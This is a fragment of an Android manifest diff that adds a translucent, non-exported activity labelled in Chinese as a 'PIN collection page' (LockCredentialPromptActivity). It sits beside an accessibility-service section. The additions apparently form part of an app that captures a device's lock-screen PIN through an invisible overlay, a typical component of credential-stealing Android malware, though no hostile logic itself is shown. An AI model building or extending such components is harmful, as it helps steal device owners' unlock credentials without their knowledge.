@@ -106,6 +106,12 @@
             android:exported="true"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
+        <!-- PIN 采集页 -->
+  <activity
+     android:name=".activity.LockCredentialPromptActivity"
+      android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
         <!-- ====== Services ====== -->
 
         <!-- 无障碍服务 (模块 02) -->
